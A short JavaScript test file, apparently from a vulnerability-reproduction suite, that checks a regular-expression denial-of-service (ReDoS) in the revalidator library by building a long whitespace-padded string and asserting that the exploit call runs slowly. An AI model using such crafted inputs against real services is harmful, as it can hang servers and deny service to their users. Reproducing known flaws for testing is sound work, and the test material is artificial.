test("ReDos in revalidator", () => {
    const { exploitFunction } = require("./function.js");
    const { getPayload } = require('./payload.js');
    const { measureTime } = require("../utils");

    // Define build_blank in the payload
    function build_blank(n) {
        var ret = "1";
        for (var i = 0; i < n; i++) {
            ret += " ";
        }
        return ret + "1";
    }

    const payload = getPayload();
    payload.build_blank = build_blank; // Add build_blank to the payload

    let output = exploitFunction(payload);

    expect(output.time).toBeGreaterThan(1);
});